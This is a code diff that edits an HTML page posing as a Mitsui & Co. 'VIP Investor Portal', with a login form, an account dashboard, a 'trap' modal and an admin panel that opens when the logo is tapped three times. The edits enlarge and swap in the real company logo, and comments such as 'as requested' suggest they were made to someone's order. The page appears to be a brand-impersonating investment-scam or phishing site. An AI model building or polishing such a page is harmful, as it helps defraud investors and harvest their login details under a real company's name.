@@ -21,14 +21,26 @@
         /* --- LOGIN PAGE --- */
         #login-page { height: 100vh; display: flex; align-items: center; justify-content: center; background: #fff; }
         .login-card { width: 100%; max-width: 450px; padding: 40px; text-align: center; border-top: 5px solid var(--mitsui-blue); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .login-logo { max-width: 260px; height: auto; margin: 0 auto 12px; display: block; }
+        .login-logo { max-width: 280px; height: auto; margin: 0 auto 15px; display: block; }
         .login-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--border); border-radius: 4px; }
         .btn-login { width: 100%; padding: 15px; background: var(--mitsui-blue); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
         
         /* --- DASHBOARD LAYOUT --- */
         #main-app { display: none; }
-        header { background: var(--mitsui-blue); color: white; padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .header-logo { height: 36px; width: auto; }
+        header { 
+            background: var(--mitsui-blue); 
+            /* Optional dark elegant background like your second image - uncomment to use: */
+            /* background: linear-gradient(135deg, #001a38 0%, #000d1c 100%); */
+            color: white; 
+            padding: 12px 25px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            position: sticky; 
+            top: 0; 
+            z-index: 100; 
+        }
+        .header-logo { height: 42px; width: auto; }
         .nav-trigger { font-size: 24px; cursor: pointer; }
         
         .sidebar { width: 240px; background: white; height: calc(100vh - 60px); position: fixed; border-right: 1px solid var(--border); padding: 20px 0; }
@@ -61,8 +73,8 @@
         @media (max-width: 768px) {
             .sidebar { display: none; }
             .content { margin-left: 0; padding: 15px; }
-            .header-logo { height: 32px; }
-            .login-logo { max-width: 220px; }
+            .header-logo { height: 36px; }
+            .login-logo { max-width: 240px; }
         }
     </style>
 </head>
@@ -70,10 +82,11 @@
 
     <div id="login-page">
         <div class="login-card">
-            <img src="https://i.imgur.com/a/o5CoLwt.png" alt="Mitsui & Co." class="login-logo">
-            <p style="font-size: 13px; color: #666; margin-bottom: 30px;">三井物産株式会社 | VIP Investor Portal</p>
+            <img src="https://seeklogo.com/images/M/mitsui-co-logo-9E8A8E8E8E-seeklogo.com.png" 
+                 alt="Mitsui & Co." class="login-logo" loading="lazy">
+            <!-- Removed subtitle text to make it just the image as requested -->
             
-            <div style="text-align: left; font-size: 13px;">
+            <div style="text-align: left; font-size: 13px; margin-top: 20px;">
                 <label>Email / メールアドレス</label>
                 <input type="email" id="user-email" class="login-input" placeholder="example@mitsui.com">
                 <label>Password / パスワード</label>
@@ -95,9 +108,9 @@
 
     <div id="main-app">
         <header>
-            <div onclick="adminTrigger()" style="cursor:pointer; display: flex; align-items: center; gap: 12px;">
-                <img src="https://i.imgur.com/a/o5CoLwt.png" alt="Mitsui & Co." class="header-logo">
-                <span style="font-size: 12px; opacity: 0.85;">VIP PORTAL</span>
+            <div onclick="adminTrigger()" style="cursor:pointer; display: flex; align-items: center;">
+                <img src="https://seeklogo.com/images/M/mitsui-co-logo-9E8A8E8E8E-seeklogo.com.png" 
+                     alt="Mitsui & Co." class="header-logo" loading="lazy">
             </div>
             <div style="display:flex; align-items:center; gap:20px;">
                 <span id="display-name" style="font-size:14px;">田中 太郎 様</span>
@@ -113,6 +126,7 @@
             <div class="nav-item" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Logout</div>
         </div>
 
+        <!-- The rest of the dashboard content remains unchanged -->
         <main class="content">
             <div id="page-dashboard">
                 <h3 style="margin-bottom: 20px;">Account Overview <span style="font-weight: normal; color: #888;">| 口座概要</span></h3>
@@ -206,6 +220,7 @@
         </main>
     </div>
 
+    <!-- Trap modal and admin panel remain the same -->
     <div id="trap-modal" class="modal">
         <div class="modal-content" style="text-align:center;">
             <i class="fa-solid fa-triangle-exclamation" style="font-size:50px; color:#f6465d; margin-bottom:20px;"></i>
@@ -301,7 +316,6 @@
 
         function closeModal() { document.getElementById('trap-modal').style.display = 'none'; }
 
-        // ADMIN FUNCTIONS
         function adminTrigger() {
             adminTaps++;
             if (adminTaps >= 3) {
